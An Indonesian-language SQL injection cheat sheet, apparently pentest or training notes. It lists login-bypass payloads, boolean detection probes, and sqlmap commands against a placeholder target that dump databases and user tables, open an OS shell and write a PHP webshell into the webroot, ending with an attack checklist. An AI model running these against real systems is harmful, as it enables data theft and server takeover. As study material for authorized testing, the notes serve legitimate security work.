# 🗃️ SQL Injection — Mengekstrak Data & Mengambil Shell

> **Tujuan:** Mengeksploitasi celah SQL Injection untuk otentikasi bypass, eksfiltrasi data, dan bahkan RCE.

---

## 📌 Penjelasan Singkat

SQL Injection terjadi ketika input pengguna **langsung disisipkan ke query SQL** tanpa parameterisasi. Dampaknya bervariasi: bypass login, dump database, atau mengeksekusi command OS.

---

## 🔓 Auth Bypass (Login Form)

```
'  OR  '1'='1'-- -       # Bypass login, kondisi selalu TRUE
admin'-- -               # Abaikan sisa query
') OR ('1'='1            # Bypass pada query dengan kurung
```

> **Penjelasan:** Server menerima kondisi `1=1` sehingga query login selalu mengembalikan hasil.

---

## 🕵️ Deteksi (Boolean Based)

```
?id=1 AND 1=1             # TRUE → response normal
?id=1 AND 1=2             # FALSE → response berbeda
```

> **Penjelasan:** Bandingkan response TRUE vs FALSE untuk konfirmasi kerentanan.

---

## 🛠️ SQLMap (Otomatis)

### Tampilkan Database

```bash
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --dbs
```

### Tampilkan Tabel

```bash
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch -D <DB> --tables
```

### Dump Data Tabel

```bash
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch -D <DB> -T users --dump
```

---

## 💀 OS Shell (RCE via SQLi)

```bash
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --os-shell
```

**Syarat `--os-shell` berhasil:**

- DBMS punya privilege eksekusi command.
- Database punya privilege FILE.
- Webroot dapat ditulis oleh user database.
- Konfigurasi server mengizinkan.

Jika sqlmap meminta lokasi webroot:

```text
Default location
    ↓
Brute force direktori umum
    ↓
Custom location
    ↓
/var/www/<nama-apps>
```

---

## ✍️ Menulis File ke Webroot

```bash
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --file-write shell.php --file-dest /var/www/<nama-apps>/shell.php
```

| Parameter | Fungsi |
|-----------|--------|
| `--file-write` | File lokal yang akan ditulis |
| `--file-dest` | Lokasi tujuan di server |

---

## ✅ Checklist SQL Injection

- [ ] Deteksi dengan boolean test (`AND 1=1` / `AND 1=2`).
- [ ] Coba auth bypass jika ada halaman login.
- [ ] Jalankan sqlmap `--dbs` untuk enumerasi database.
- [ ] Dump tabel menarik (users, config).
- [ ] Coba `--os-shell` untuk RCE.
- [ ] Tulis webshell via `--file-write` jika perlu.

---

## 📚 Referensi

- [OWASP – SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings – SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [sqlmap official](https://sqlmap.org/)
